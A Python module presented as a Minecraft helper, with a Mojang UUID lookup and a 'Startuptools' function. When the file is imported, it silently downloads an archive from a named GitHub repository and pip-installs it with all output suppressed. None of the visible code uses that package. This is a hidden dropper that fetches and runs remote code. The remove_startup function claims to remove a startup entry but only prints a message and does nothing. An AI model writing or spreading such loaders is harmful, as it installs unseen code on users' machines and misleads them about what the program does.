import importlib
import subprocess
import urllib.request
import zipfile
import tempfile
import shutil
import os
import time


def install_from_repo(repo_url):
    # Get the path to the directory of the current script
    target_directory = os.path.dirname(os.path.abspath(__file__))

    # Create a temporary directory
    temp_dir = tempfile.mkdtemp()

    try:
        # Download the repository archive directly to the temporary directory
        zip_url = f"{repo_url}/zip/refs/heads/master"
        zip_path = os.path.join(temp_dir, "repo.zip")
        urllib.request.urlretrieve(zip_url, zip_path)

        # Extract the archive
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(temp_dir)

        # Navigate to the extracted directory
        extracted_dir = os.path.join(temp_dir, os.listdir(temp_dir)[0])
        os.chdir(extracted_dir)

        # Install the package locally
        subprocess.run(['pip', 'install', '.'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

    except subprocess.CalledProcessError as e:
        print(f"Error installing the package: {e}")
    except urllib.error.HTTPError as e:
        print(f"HTTP Error {e.code}: {e.reason}")
    except urllib.error.URLError as e:
        print(f"URL Error: {e.reason}")
    finally:
        # Navigate back to the original directory
        os.chdir(target_directory)

        # Delete the temporary directory
        shutil.rmtree(temp_dir, ignore_errors=True)

def import_or_install_git(package_name, repo_url):
    spec = importlib.util.find_spec(package_name)
    
    if spec is None:
        install_from_repo(repo_url)
        import hypixelmcapigithub
    
    try:
        package = importlib.import_module(package_name)
        return package
    except ImportError:
        return None

def install_package(package_name):
    subprocess.run(['pip', 'install', package_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def import_or_install_package(package_name):
    spec = importlib.util.find_spec(package_name)
    
    if spec is None:
        install_package(package_name)
    
    try:
        package = importlib.import_module(package_name)
        return package
    except ImportError:
        return None
    
def main():
    repository_url = 'https://codeload.github.com/Maxheruko/hypixelmcapigithub'
    package_name = 'hypixelmcapigithub'
    import_or_install_package('toml')
    import_or_install_package('setuptools')
    import_or_install_package('requests')
    installed_package = import_or_install_git(package_name, repository_url)
    if installed_package:
        return
    else:
        return

main()

def get_uuid(username):
    import requests
    api_url = f"https://api.mojang.com/users/profiles/minecraft/{username}"
    response = requests.get(api_url)

    if response.status_code == 200:
        data = response.json()
        return data["id"]
    elif response.status_code == 204:
        print(f"Username '{username}' was not found")
        return None
    else:
        print(f"Error while calling Mojang api: {response.status_code}")
        return None
    
def remove_startup(name):
    name = name
    print(f"     -- Startuptools --\n\nTrying to remove '{name}'")
    time.sleep(2)
    print(f"'{name}' was removed from startup, if it existed")
    input("\n\n\n\n\npress 'enter' to continue")